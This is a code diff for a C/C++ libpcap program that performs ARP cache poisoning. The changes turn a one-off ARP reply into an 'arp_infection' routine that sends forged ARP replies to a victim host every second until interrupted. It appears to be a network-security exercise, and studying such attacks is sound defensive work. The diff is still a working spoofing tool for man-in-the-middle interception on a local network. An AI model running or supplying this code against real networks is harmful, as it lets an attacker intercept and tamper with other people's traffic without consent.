@@ -5,8 +5,26 @@
 #include <netinet/in.h>
 #include <sys/utsname.h>
 #include <netdb.h>
+#include <iostream>
+#include <net/ethernet.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <thread>
+#include <signal.h>
+#include <unistd.h>
 
 #define PCAP_OPENFLAG_PROMISCUOUS   1   // Even if it isn't my mac, receive packet
+
+using namespace std;
+namespace
+{
+    volatile sig_atomic_t quit;
+    void signal_handler(int sig)
+        {
+            signal(sig, signal_handler);
+            quit = 1;
+        }
+}
 #pragma pack(push,1)
 struct _ether_hdr{
     uint8_t Dst_mac[6];
@@ -33,6 +51,7 @@ void mac_changer(const char *ipm,uint8_t *opm) //ipm = inputmac, opm = outputmac
 {
     sscanf(ipm,"%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",&opm[0],&opm[1],&opm[2],&opm[3],&opm[4],&opm[5]);    //%x cause an error, fix to %2hhx
 }
+
 void arp_request(char *snd_ip,char *snd_mac,char *trg_ip,pcap_t *fp)
 {
     struct my_hdr mh;
@@ -55,8 +74,9 @@ void arp_request(char *snd_ip,char *snd_mac,char *trg_ip,pcap_t *fp)
         fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
     }
 }
-void arp_reply(char *snd_ip,char *snd_mac,char *trg_ip, char *trg_mac,pcap_t *fp)
+void arp_infection(char *snd_ip,char *snd_mac,char *trg_ip, char *trg_mac,pcap_t *fp)
 {
+    cout<<"Send arp reply..."<<endl;
     struct my_hdr mh;
     struct _ether_hdr *eh = &mh.eh;
     struct _arp_hdr *ah = &mh.ah;
@@ -72,11 +92,34 @@ void arp_reply(char *snd_ip,char *snd_mac,char *trg_ip, char *trg_mac,pcap_t *fp
     ah->hlen = 0x06;
     ah->plen = 0x04;
     ah->opcode = ntohs(0x0002);
-    if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
+    while(!quit)
     {
-        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
+        if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
+        {
+            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
+        }
+        sleep(1);
     }
 }
+/*
+void get_addr(pcap_t *fp,char *rcv_ip)
+{
+    struct bpf_program fcode;
+    struct ether_header *eh;
+    struct ip *ip_h;
+//    struct pcap_pkthdr *;
+
+    cout<<"Getting reciever's mac addr..."<<endl;
+    if(pcap_compile(fp,&fcode,IP_HDR_FILLTER,1,NULL) < 0)
+    {
+        cout<<"pcap_compile_error"<<endl;
+    }
+    if(pcap_setfilter(fp,&fcode)<0)
+    {
+        cout<<"pcap_set_filter_error"<<endl;
+    }
+}
+*/
 int main(int argc,char *argv[])
 {
     if(argc != 6)
@@ -100,12 +143,14 @@ int main(int argc,char *argv[])
     char errbuf[PCAP_ERRBUF_SIZE];
 
     pcap_t *fp;
+    struct bpf_program fcode;
 
-    if ( (fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
+    if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
     {
         fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
     }
-    //arp_reply(rcv_ip,atk_mac,snd_ip,snd_mac,fp);  //send infection packet
+//    get_addr(fp,rcv_ip);
+    signal(SIGINT,signal_handler);
+    thread(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,fp).join();  //send arp_infection to victim periodically
    //arp_request(atk_ip,atk_mac,rcv_ip,fp);    //send who has rcv_ip?
-
 }
